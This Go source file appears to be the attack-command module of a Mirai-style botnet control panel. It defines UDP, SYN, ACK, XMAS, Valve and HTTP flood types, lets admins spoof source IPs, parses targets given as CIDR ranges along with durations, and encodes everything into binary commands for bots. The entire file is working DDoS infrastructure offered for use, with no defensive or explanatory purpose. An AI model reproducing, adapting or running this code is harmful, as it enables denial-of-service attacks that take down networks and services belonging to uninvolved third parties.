package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
attackID          uint8
attackFlags       []uint8
attackDescription string
}

type Attack struct {
Duration uint32
Type     uint8
Targets  map[uint32]uint8
Flags    map[uint8]string
}

type FlagInfo struct {
flagID          uint8
flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    "len": FlagInfo {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "rand": FlagInfo {
        1,
        "Randomize packet data content, default is 1 (yes)",
    },
    "tos": FlagInfo {
        2,
        "TOS field value in IP header, default is 0",
    },
    "ident": FlagInfo {
        3,
        "ID field value in IP header, default is random",
    },
    "ttl": FlagInfo {
        4,
        "TTL field in IP header, default is 255",
    },
    "df": FlagInfo {
        5,
        "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": FlagInfo {
        6,
        "Source port, default is random",
    },
    "dport": FlagInfo {
        7,
        "Destination port, default is random",
    },
    "domain": FlagInfo {
        8,
        "Domain name to attack",
    },
    "dhid": FlagInfo {
        9,
        "Domain name transaction ID, default is random",
    },
    "urg": FlagInfo {
        11,
        "Set the URG bit in IP header, default is 0 (no)",
    },
    "ack": FlagInfo {
        12,
        "Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
    },
    "psh": FlagInfo {
        13,
        "Set the PSH bit in IP header, default is 0 (no)",
    },
    "rst": FlagInfo {
        14,
        "Set the RST bit in IP header, default is 0 (no)",
    },
    "syn": FlagInfo {
        15,
        "Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
    },
    "fin": FlagInfo {
        16,
        "Set the FIN bit in IP header, default is 0 (no)",
    },
    "seqnum": FlagInfo {
        17,
        "Sequence number value in TCP header, default is random",
    },
    "acknum": FlagInfo {
        18,
        "Ack number value in TCP header, default is random",
    },
    "gcip": FlagInfo {
        19,
        "Set internal IP to destination ip, default is 0 (no)",
    },
    "method": FlagInfo {
        20,
        "HTTP method name, default is get",
    },
    "postdata": FlagInfo {
        21,
        "POST data, default is empty/none",
    },
    "path": FlagInfo {
        22,
        "HTTP path, default is /",
    },
    "conns": FlagInfo {
        24,
        "Number of connections",
    },
    "source": FlagInfo {
        25,
        "Source IP address, 255.255.255.255 for random",
    },
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "udp": AttackInfo {
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "udp [ip] [time] dport=[port]",
    },
    "vse": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "valve [ip] [time] dport=[port]",
    },
    "syn": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "syn [ip] [time] dport=[port]",
    },
    "ack": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ack [ip] [time] dport=[port]",
    },
    "udpplain": AttackInfo {
        5,
        []uint8 {0, 1, 7},
        "udpplain [ip] [time] dport=[port]",
    },
	"xmas": AttackInfo {
        7,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "xmas [ip] [time] dport=[port]",
    },
	"std": AttackInfo {
        8,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "std [ip] [time] dport=[port]",
    },
    "http": AttackInfo {
        8,
        []uint8 {8, 7, 20, 21, 22, 24},
        "http [ip] [time] domain=[ip] conns=[400]",
    },
}

func uint8InSlice(a uint8, list []uint8) bool {
for _, b := range list {
if b == a {
return true
}
}

return false
}

func NewAttack(str string, admin int) (*Attack, error) {
atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
args, _ := shellwords.Parse(str)

var atkInfo AttackInfo
if len(args) == 0 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mMust Specify an Attack\033[00;97m")
} else {
if args[0] == "9UIOGHBYUIgv7TYUC678tf" {
validCmdList := "                                \033[00;1;96m║\033[00;1;95mAvailable Attack List\033[00;97m"
for cmdName, atkInfo := range attackInfoLookup {
validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
}
return nil, errors.New(validCmdList)
}

var exists bool
atkInfo, exists = attackInfoLookup[args[0]]
if !exists {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95m%s \033[91mIs Invalid!\033[00;97m", args[0]))
}

atk.Type = atkInfo.attackID
args = args[1:]
}

if len(args) == 0 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mInvalid!\033[00;97m")
} else {
if args[0] == "9UIOGHBYUIgv7TYUC678tf" {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mComma delimited\033[00;97m")
}

cidrArgs := strings.Split(args[0], ",")
if len(cidrArgs) > 255 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mCannot specify more than 255\033[00;97m")
}

for _, cidr := range cidrArgs {
prefix := ""
netmask := uint8(32)
cidrInfo := strings.Split(cidr, "/")
if len(cidrInfo) == 0 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mBlank target specified!\033[00;97m")
}

prefix = cidrInfo[0]
if len(cidrInfo) == 2 {
netmaskTmp, err := strconv.Atoi(cidrInfo[1])
if err != nil || netmask > 32 || netmask < 0 {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mInvalid netmask was supplied,\033[00;1;96m %s\033[00;97m", cidr))
}

netmask = uint8(netmaskTmp)
} else if len(cidrInfo) > 2 {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mToo many /'s in prefix,\033[00;1;96m %s\033[00;97m", cidr))
}

ip := net.ParseIP(prefix)
if ip == nil {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mFailed to parse IP,\033[00;1;96m %s\033[00;97m", cidr))
}

atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
}
args = args[1:]
}

if len(args) == 0 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mMust Specify an Attack Duration\033[00;97m")
} else {
if args[0] == "9UIOGHBYUIgv7TYUC678tf" {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mDuration Of Attack In seconds\033[00;97m")
}

duration, err := strconv.Atoi(args[0])
if err != nil || duration == 0 || duration > 300 {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mInvalid Attack Duration,\033[00;1;96m %s\033[00;97m", args[0]))
}

atk.Duration = uint32(duration)
args = args[1:]
}

for len(args) > 0 {
if args[0] == "flags" {
validFlags := "                                \033[00;1;96m║\033[00;1;96mList Of Flags Key=Val By Spaces\033[00;97m\r\n"
for _, flagID := range atkInfo.attackFlags {
for flagName, flagInfo := range flagInfoLookup {
if flagID == flagInfo.flagID {
validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
break
}
}
}
validFlags += "                                \033[00;1;96m║\033[00;1;96mValue of 65535 for a flag denotes\033[00;97m\r\n"
return nil, errors.New(validFlags)
}
flagSplit := strings.SplitN(args[0], "=", 2)
if len(flagSplit) != 2 {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mInvalid Flag Near, %s\033[00;97m", args[0]))
}

if len(flagSplit[1]) == 0 {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mInvalid Flag!\033[00;97m"))
}

flagInfo, exists := flagInfoLookup[flagSplit[0]]
if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
return nil, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;96mInvalid Flag key. %s Near, %s\033[00;97m", flagSplit[0], args[0]))
}

if flagSplit[1][0] == '"' {
flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
fmt.Println(flagSplit[1])
}
if flagSplit[1] == "true" {
flagSplit[1] = "1"
} else if flagSplit[1] == "false" {
flagSplit[1] = "0"
}
atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
args = args[1:]
}
if len(atk.Flags) > 255 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mNo More Then 255 Flags\033[00;97m")
}
return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
buf := make([]byte, 0)
var tmp []byte

tmp = make([]byte, 4)
binary.BigEndian.PutUint32(tmp, this.Duration)
buf = append(buf, tmp...)

buf = append(buf, byte(this.Type))

buf = append(buf, byte(len(this.Targets)))

for prefix, netmask := range this.Targets {
tmp = make([]byte, 5)
binary.BigEndian.PutUint32(tmp, prefix)
tmp[4] = byte(netmask)
buf = append(buf, tmp...)
}

buf = append(buf, byte(len(this.Flags)))

for key, val := range this.Flags {
tmp = make([]byte, 2)
tmp[0] = key
strbuf := []byte(val)
if len(strbuf) > 255 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mFlag Value Cannot Be More Than 255 Bytes!\033[00;97m")
}

tmp[1] = uint8(len(strbuf))
tmp = append(tmp, strbuf...)
buf = append(buf, tmp...)
}

if len(buf) > 4096 {
return nil, errors.New("                                \033[00;1;96m║\033[00;1;96mMax Buffer Is 4096\033[00;97m")
}

tmp = make([]byte, 2)
binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
buf = append(tmp, buf...)
return buf, nil
}
